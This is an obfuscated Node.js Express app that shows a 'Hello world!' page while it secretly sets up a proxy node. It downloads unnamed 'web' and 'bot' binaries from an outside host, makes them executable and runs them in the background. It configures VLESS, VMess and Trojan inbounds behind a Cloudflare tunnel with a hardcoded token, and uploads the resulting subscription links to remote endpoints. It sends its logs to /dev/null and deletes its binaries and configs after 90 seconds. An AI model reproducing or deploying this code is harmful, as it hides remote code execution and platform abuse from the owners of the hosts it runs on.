const _0x1a = ["express", "axios", "os", "fs", "path", "util", "child_process", "env", "UPLOAD_URL", "PROJECT_URL", "AUTO_ACCESS", "FILE_PATH", "SUB_PATH", "SERVER_PORT", "PORT", "UUID", "ARGO_DOMAIN", "ARGO_AUTH", "ARGO_PORT", "CFIP", "CFPORT", "NAME", "existsSync", "mkdirSync", "charAt", "floor", "random", "join", "readFileSync", "from", "toString", "split", "filter", "test", "post", "stringify", "readdirSync", "statSync", "isFile", "unlinkSync", "get", "send", "writeFileSync", "arch", "createWriteStream", "pipe", "on", "close", "basename", "unlink", "all", "chmod", "match", "includes", "platform", "del /f /q ", "rm -rf ", "clear", "log", "error", "listen"];
function _0xget(i) { return _0x1a[i]; }

const express = require(_0xget(0));
const app = express();
const axios = require(_0xget(1));
const os = require(_0xget(2));
const fs = require(_0xget(3));
const path = require(_0xget(4));
const { promisify } = require(_0xget(5));
const exec = promisify(require(_0xget(6)).exec);
const { execSync } = require(_0xget(6));

const _ENV = process[_0xget(7)];
const _0xU = _ENV[_0xget(8)] || '';
const _0xP = _ENV[_0xget(9)] || '';
const _0xAA = _ENV[_0xget(10)] || false;
const _0xFP = _ENV[_0xget(11)] || './tmp';
const _0xSP = _ENV[_0xget(12)] || 'sub';
const _0xPT = _ENV[_0xget(13)] || _ENV[_0xget(14)] || 3000;
const _0xID = _ENV[_0xget(15)] || 'bc97f674-c578-4940-9234-0a1da46041b9';
const _0xAD = _ENV[_0xget(16)] || 'deployzy.bigiq.de5.net';
const _0xAT = _ENV[_0xget(17)] || 'eyJhIjoiODMzODQxZDFjYzE3MzEyYjZmZDkwNjBiZjdjNDY5MmMiLCJ0IjoiYjhlYjFiMjItOWFhNC00ODEwLTk5MmEtNDIyMjk0OWIyYWY0IiwicyI6Ik9XTmpOVEE1TjJRdE9UYzRNaTAwTlRoaUxXSTNNRGt0TWpOa1ltVXpPRFJtTlRBeiJ9';
const _0xAP = _ENV[_0xget(18)] || 8001;
const _0xCI = _ENV[_0xget(19)] || 'saas.sin.fan';
const _0xCP = _ENV[_0xget(20)] || 443;
const _0xNM = _ENV[_0xget(21)] || '';

if (!fs[_0xget(22)](_0xFP)) {
  fs[_0xget(23)](_0xFP);
  console[_0xget(58)](`${_0xFP} is created`);
} else {
  console[_0xget(58)](`${_0xFP} already exists`);
}

function _0xrName() {
  const _s = 'abcdefghijklmnopqrstuvwxyz';
  let _r = '';
  for (let i = 0; i < 6; i++) {
    _r += _s[_0xget(24)](Math[_0xget(25)](Math[_0xget(26)]() * _s.length));
  }
  return _r;
}

const _0xwN = _0xrName();
const _0xbN = _0xrName();
let _0xwP = path[_0xget(27)](_0xFP, _0xwN);
let _0xbP = path[_0xget(27)](_0xFP, _0xbN);
let _0xsP = path[_0xget(27)](_0xFP, 'sub.txt');
let _0xlP = path[_0xget(27)](_0xFP, 'list.txt');
let _0xbL = path[_0xget(27)](_0xFP, 'boot.log');
let _0xcP = path[_0xget(27)](_0xFP, 'config.json');

function _0xdN() {
  try {
    if (!_0xU || !fs[_0xget(22)](_0xsP)) return null;
    let _c;
    try {
      _c = fs[_0xget(28)](_0xsP, 'utf-8');
    } catch { return null; }
    const _dec = Buffer[_0xget(29)](_c, 'base64')[_0xget(30)]('utf-8');
    const _nds = _dec[_0xget(31)]('\n')[_0xget(32)](_l => /(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xget(33)](_l));
    if (_nds.length === 0) return null;
    axios[_0xget(34)](`${_0xU}/api/delete-nodes`, JSON[_0xget(35)]({ nodes: _nds }), {
      headers: { 'Content-Type': 'application/json' }
    }).catch(() => null);
  } catch { return null; }
}

function _0xclOld() {
  try {
    const _fs = fs[_0xget(36)](_0xFP);
    _fs.forEach(_f => {
      const _fp = path[_0xget(27)](_0xFP, _f);
      try {
        if (fs[_0xget(37)](_fp)[_0xget(38)]()) fs[_0xget(39)](_fp);
      } catch {}
    });
  } catch {}
}

app[_0xget(40)]('/', (_q, _s) => _s[_0xget(41)]('Hello world!'));

async function _0xgCfg() {
  const _cfg = {
    log: { access: '/dev/null', error: '/dev/null', loglevel: 'none' },
    inbounds: [
      { port: _0xAP, protocol: 'vless', settings: { clients: [{ id: _0xID, flow: 'xtls-rprx-vision' }], decryption: 'none', fallbacks: [{ dest: 3001 }, { path: '/vless-argo', dest: 3002 }, { path: '/vmess-argo', dest: 3003 }, { path: '/trojan-argo', dest: 3004 }] }, streamSettings: { network: 'tcp' } },
      { port: 3001, listen: '127.0.0.1', protocol: 'vless', settings: { clients: [{ id: _0xID }], decryption: 'none' }, streamSettings: { network: 'tcp', security: 'none' } },
      { port: 3002, listen: '127.0.0.1', protocol: 'vless', settings: { clients: [{ id: _0xID, level: 0 }], decryption: 'none' }, streamSettings: { network: 'ws', security: 'none', wsSettings: { path: '/vless-argo' } }, sniffing: { enabled: true, destOverride: ['http', 'tls', 'quic'], metadataOnly: false } },
      { port: 3003, listen: '127.0.0.1', protocol: 'vmess', settings: { clients: [{ id: _0xID, alterId: 0 }] }, streamSettings: { network: 'ws', wsSettings: { path: '/vmess-argo' } }, sniffing: { enabled: true, destOverride: ['http', 'tls', 'quic'], metadataOnly: false } },
      { port: 3004, listen: '127.0.0.1', protocol: 'trojan', settings: { clients: [{ password: _0xID }] }, streamSettings: { network: 'ws', security: 'none', wsSettings: { path: '/trojan-argo' } }, sniffing: { enabled: true, destOverride: ['http', 'tls', 'quic'], metadataOnly: false } }
    ],
    dns: { servers: ['https+local://8.8.8.8/dns-query'] },
    outbounds: [{ protocol: 'freedom', tag: 'direct' }, { protocol: 'blackhole', tag: 'block' }]
  };
  fs[_0xget(42)](path[_0xget(27)](_0xFP, 'config.json'), JSON[_0xget(35)](_cfg, null, 2));
}

function _0xgArch() {
  const _a = os[_0xget(43)]();
  return (_a === 'arm' || _a === 'arm64' || _a === 'aarch64') ? 'arm' : 'amd';
}

function _0xdlF(fName, fUrl, cb) {
  if (!fs[_0xget(22)](_0xFP)) fs[_0xget(23)](_0xFP, { recursive: true });
  const _w = fs[_0xget(44)](fName);
  axios({ method: 'get', url: fUrl, responseType: 'stream' })
    .then(res => {
      res.data[_0xget(45)](_w);
      _w[_0xget(46)](_0xget(47), () => {
        _w[_0xget(47)]();
        console[_0xget(58)](`Download ${path[_0xget(48)](fName)} successfully`);
        cb(null, fName);
      });
      _w[_0xget(46)]('error', err => {
        fs[_0xget(49)](fName, () => {});
        const msg = `Download ${path[_0xget(48)](fName)} failed: ${err.message}`;
        console[_0xget(59)](msg);
        cb(msg);
      });
    })
    .catch(err => {
      const msg = `Download ${path[_0xget(48)](fName)} failed: ${err.message}`;
      console[_0xget(59)](msg);
      cb(msg);
    });
}

function _0xgFiles(_arc) {
  const _p = _arc === 'arm' ? 'arm64' : 'amd64';
  return [
    { fileName: _0xwP, fileUrl: `https://${_p}.ssss.nyc.mn/web` },
    { fileName: _0xbP, fileUrl: `https://${_p}.ssss.nyc.mn/bot` }
  ];
}

async function _0xdlRun() {
  const _fls = _0xgFiles(_0xgArch());
  if (_fls.length === 0) return;
  const _ps = _fls.map(i => new Promise((res, rej) => {
    _0xdlF(i.fileName, i.fileUrl, (e, p) => e ? rej(e) : res(p));
  }));
  try {
    await Promise[_0xget(50)](_ps);
  } catch (e) {
    console[_0xget(59)]('Error downloading files:', e);
    return;
  }

  [_0xwP, _0xbP].forEach(_f => {
    if (fs[_0xget(22)](_f)) {
      fs[_0xget(51)](_f, 0o775, err => {
        if (err) console[_0xget(59)](`Empowerment failed for ${_f}: ${err}`);
        else console[_0xget(58)](`Empowerment success for ${_f}: ${(0o775)[_0xget(30)](8)}`);
      });
    }
  });

  try {
    await exec(`nohup ${_0xwP} -c ${_0xFP}/config.json >/dev/null 2>&1 &`);
    console[_0xget(58)](`${_0xwN} is running`);
    await new Promise(r => setTimeout(r, 1000));
  } catch (e) {
    console[_0xget(59)](`web running error: ${e}`);
  }

  if (fs[_0xget(22)](_0xbP)) {
    let args;
    if (_0xAT[_0xget(52)](/^[A-Z0-9a-z=]{120,250}$/)) {
      args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${_0xAT}`;
    } else if (_0xAT[_0xget(52)](/TunnelSecret/)) {
      args = `tunnel --edge-ip-version auto --config ${_0xFP}/tunnel.yml run`;
    } else {
      args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${_0xFP}/boot.log --loglevel info --url http://localhost:${_0xAP}`;
    }
    try {
      await exec(`nohup ${_0xbP} ${args} >/dev/null 2>&1 &`);
      console[_0xget(58)](`${_0xbN} is running`);
      await new Promise(r => setTimeout(r, 2000));
    } catch (e) {
      console[_0xget(59)](`Error executing command: ${e}`);
    }
  }
  await new Promise(r => setTimeout(r, 5000));
}

function _0xaType() {
  if (!_0xAT || !_0xAD) {
    console[_0xget(58)]("ARGO_DOMAIN or ARGO_AUTH variable is empty, use quick tunnels");
    return;
  }
  if (_0xAT[_0xget(53)]('TunnelSecret')) {
    fs[_0xget(42)](path[_0xget(27)](_0xFP, 'tunnel.json'), _0xAT);
    const yml = `\ntunnel: ${_0xAT[_0xget(31)]('"')[11]}\ncredentials-file: ${path[_0xget(27)](_0xFP, 'tunnel.json')}\nprotocol: http2\n\ningress:\n  - hostname: ${_0xAD}\n    service: http://localhost:${_0xAP}\n    originRequest:\n      noTLSVerify: true\n  - service: http_status:404\n`;
    fs[_0xget(42)](path[_0xget(27)](_0xFP, 'tunnel.yml'), yml);
  } else {
    console[_0xget(58)]("ARGO_AUTH mismatch TunnelSecret,use token connect to tunnel");
  }
}
_0xaType();

async function _0xextDom() {
  let dom;
  if (_0xAT && _0xAD) {
    dom = _0xAD;
    console[_0xget(58)]('ARGO_DOMAIN:', dom);
    await _0xgenL(dom);
  } else {
    try {
      const raw = fs[_0xget(28)](path[_0xget(27)](_0xFP, 'boot.log'), 'utf-8');
      const lines = raw[_0xget(31)]('\n');
      const matches = [];
      lines.forEach(l => {
        const m = l[_0xget(52)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);
        if (m) matches.push(m[1]);
      });
      if (matches.length > 0) {
        dom = matches[0];
        console[_0xget(58)]('ArgoDomain:', dom);
        await _0xgenL(dom);
      } else {
        console[_0xget(58)]('ArgoDomain not found, re-running bot to obtain ArgoDomain');
        fs[_0xget(39)](path[_0xget(27)](_0xFP, 'boot.log'));
        async function _kBot() {
          try {
            if (process[_0xget(54)] === 'win32') {
              await exec(`taskkill /f /im ${_0xbN}.exe > nul 2>&1`);
            } else {
              await exec(`pkill -f "[${_0xbN[_0xget(24)](0)}]${_0xbN.substring(1)}" > /dev/null 2>&1`);
            }
          } catch {}
        }
        await _kBot();
        await new Promise(r => setTimeout(r, 3000));
        const args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${_0xFP}/boot.log --loglevel info --url http://localhost:${_0xAP}`;
        try {
          await exec(`nohup ${_0xbP} ${args} >/dev/null 2>&1 &`);
          console[_0xget(58)](`${_0xbN} is running`);
          await new Promise(r => setTimeout(r, 3000));
          await _0xextDom();
        } catch (e) {
          console[_0xget(59)](`Error executing command: ${e}`);
        }
      }
    } catch (e) {
      console[_0xget(59)]('Error reading boot.log:', e);
    }
  }

  async function _0xgenL(argoDomain) {
    const metaInfo = execSync(
      'curl -sm 5 https://speed.cloudflare.com/meta | awk -F\\" \'{print $26"-"$18}\' | sed -e \'s/ /_/g\'',
      { encoding: 'utf-8' }
    );
    const ISP = metaInfo.trim();
    const nodeName = _0xNM ? `${_0xNM}-${ISP}` : ISP;

    return new Promise(res => {
      setTimeout(() => {
        const VMESS = { v: '2', ps: `${nodeName}`, add: _0xCI, port: _0xCP, id: _0xID, aid: '0', scy: 'none', net: 'ws', type: 'none', host: argoDomain, path: '/vmess-argo?ed=2560', tls: 'tls', sni: argoDomain, alpn: '', fp: 'firefox' };
        const subTxt = `\nvless://${_0xID}@${_0xCI}:${_0xCP}?encryption=none&security=tls&sni=${argoDomain}&fp=firefox&type=ws&host=${argoDomain}&path=%2Fvless-argo%3Fed%3D2560#${nodeName}\n\nvmess://${Buffer[_0xget(29)](JSON[_0xget(35)](VMESS))[_0xget(30)]('base64')}\n\ntrojan://${_0xID}@${_0xCI}:${_0xCP}?security=tls&sni=${argoDomain}&fp=firefox&type=ws&host=${argoDomain}&path=%2Ftrojan-argo%3Fed%3D2560#${nodeName}\n`;
        const b64 = Buffer[_0xget(29)](subTxt)[_0xget(30)]('base64');
        console[_0xget(58)](b64);
        fs[_0xget(42)](_0xsP, b64);
        console[_0xget(58)](`${_0xFP}/sub.txt saved successfully`);
        _0xupN();
        app[_0xget(40)](`/${_0xSP}`, (_rq, _rs) => {
          _rs.set('Content-Type', 'text/plain; charset=utf-8');
          _rs[_0xget(41)](b64);
        });
        res(subTxt);
      }, 2000);
    });
  }
}

async function _0xupN() {
  if (_0xU && _0xP) {
    const j = { subscription: [`${_0xP}/${_0xSP}`] };
    try {
      const res = await axios[_0xget(34)](`${_0xU}/api/add-subscriptions`, j, { headers: { 'Content-Type': 'application/json' } });
      if (res && res.status === 200) console[_0xget(58)]('Subscription uploaded successfully');
    } catch {}
  } else if (_0xU) {
    if (!fs[_0xget(22)](_0xlP)) return;
    const cnt = fs[_0xget(28)](_0xlP, 'utf-8');
    const nds = cnt[_0xget(31)]('\n')[_0xget(32)](l => /(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xget(33)](l));
    if (nds.length === 0) return;
    try {
      const res = await axios[_0xget(34)](`${_0xU}/api/add-nodes`, JSON[_0xget(35)]({ nodes: nds }), { headers: { 'Content-Type': 'application/json' } });
      if (res && res.status === 200) console[_0xget(58)]('Nodes uploaded successfully');
    } catch {}
  }
}

function _0xclF() {
  setTimeout(() => {
    const targets = [_0xbL, _0xcP, _0xwP, _0xbP];
    const cmd = process[_0xget(54)] === 'win32'
      ? `${_0xget(55)}${targets.join(' ')} > nul 2>&1`
      : `${_0xget(56)}${targets.join(' ')} >/dev/null 2>&1`;
    exec(cmd, () => {
      console[_0xget(57)]();
      console[_0xget(58)]('App is running');
      console[_0xget(58)]('Thank you for using this script, enjoy!');
    });
  }, 90000);
}
_0xclF();

async function _0xvisT() {
  if (!_0xAA || !_0xP) return;
  try {
    await axios[_0xget(34)]('https://oooo.serv00.net/add-url', { url: _0xP }, { headers: { 'Content-Type': 'application/json' } });
    console[_0xget(58)]('automatic access task added successfully');
  } catch (e) {
    console[_0xget(59)](`Add automatic access task faild: ${e.message}`);
  }
}

async function startserver() {
  try {
    _0xdN();
    _0xclOld();
    await _0xgCfg();
    await _0xdlRun();
    await _0xextDom();
    await _0xvisT();
  } catch (e) {
    console[_0xget(59)]('Error in startserver:', e);
  }
}

startserver().catch(e => console[_0xget(59)]('Unhandled error in startserver:', e));

app[_0xget(60)](_0xPT, () => console[_0xget(58)](`http server is running on port:${_0xPT}!`));
